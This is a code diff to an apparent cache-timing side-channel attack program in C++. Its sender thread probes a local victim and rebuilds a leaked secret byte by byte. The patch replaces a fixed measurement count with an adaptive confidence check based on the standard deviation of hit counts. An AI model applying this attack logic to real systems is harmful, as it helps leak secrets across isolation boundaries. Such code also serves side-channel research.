@@ -22,6 +22,7 @@
 #include <tuple>
 #include <algorithm>
 #include <numeric>
+#include <valarray>
 
 // C Includes:
 #include <cstdio>
@@ -484,7 +485,7 @@ void send_worker(uint16_t port = 7777) {
   assert(s.setRemote("127.0.0.1", port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
 
-  constexpr size_t MAX_MEASUREMENTS = 128;
+  size_t measurements = 128;
   std::string secret(target_len, 0);
 
   // Initialize target x to send to victim:
@@ -507,17 +508,15 @@ void send_worker(uint16_t port = 7777) {
 
     // Timeseries intialization:
     // - reservation avoids memory allocation during side-channel anaylsis.
-    hit_ts.clear();
-    hit_ts.resize(MAX_MEASUREMENTS); // Pre-allocate measurement space on heap!
+    hit_ts.resize(measurements); // Pre-allocate measurement space on heap!
 #ifdef ACCURATE_LATENCIES
-    latency_ts.clear();
-    latency_ts.resize(MAX_MEASUREMENTS);
+    latency_ts.resize(measurements);
 #endif
 
 
     // Repeat attack 100 times / byte:
     // - TODO: replace with a dynamic confidence mechanism?...
-    while (++tries % MAX_MEASUREMENTS != 0) {
+    while (++tries % measurements != 0) {
       const auto attempt = tries-1;
 
       // Ensure side-channel array is uncached:
@@ -559,7 +558,7 @@ void send_worker(uint16_t port = 7777) {
 
 
     // Summarize measurements:
-    std::vector<size_t> counts(256, size_t(0));
+    std::valarray<double> counts(256, 0);
     for (size_t b = 0; b < counts.size(); b++) {
       // for each measurement, count all bits set:
       for (size_t t = 0; t < tries; t++) {
@@ -571,25 +570,43 @@ void send_worker(uint16_t port = 7777) {
     // Output results from attack:
     std::cout << "Results for target_x_offset: " << m.x << '\n';
     auto counts_idx = sort_indexes(counts);
-    size_t last = std::numeric_limits<size_t>::max();
+//    size_t last = std::numeric_limits<size_t>::max();
     for (size_t idx : counts_idx) {
-      const auto hits = counts.at(idx);
+      const auto hits = counts[idx];
       if (hits == 0) { break; }
       std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
                 << hits << " hits." << std::endl;
-      last = idx;
+//      last = idx;
     }
-    if (last < 256) {
-      secret.at(m.x - target_x_offset) = last;
-    }
+//    if (last < 256) {
+//      secret.at(m.x - target_x_offset) = last;
+//    }
 
-    // Reset measurements:
-    tries = 0;
-#ifndef INTERACTIVE
-    if (++m.x >= (target_x_offset + target_len)) {
-      break;  // break out of forever loop.
+    // Dynamic confidence adjustment:
+    double sum = counts.sum();
+    double mean = sum / counts.size();
+    double sum_sq = (counts * counts).sum();
+    double variance = (sum_sq - (sum*sum)/counts.size()) / (counts.size() - 1);
+    double stdev = sqrt(variance);
+
+    bool confident = stdev > 2;
+    if (!confident) {
+      measurements *= 2; // double the number of measurements
     }
+    else {
+      secret.at(m.x - target_x_offset) = counts_idx.at(0);
+      tries = 0;
+      hit_ts.clear();
+#ifdef ACCURATE_LATENCIES
+      latency_ts.clear();
 #endif
+
+#ifndef INTERACTIVE
+      if (++m.x >= (target_x_offset + target_len)) {
+        break;  // break out of forever loop.
+      }
+#endif
+    }
   }
 
   // Print out secret:
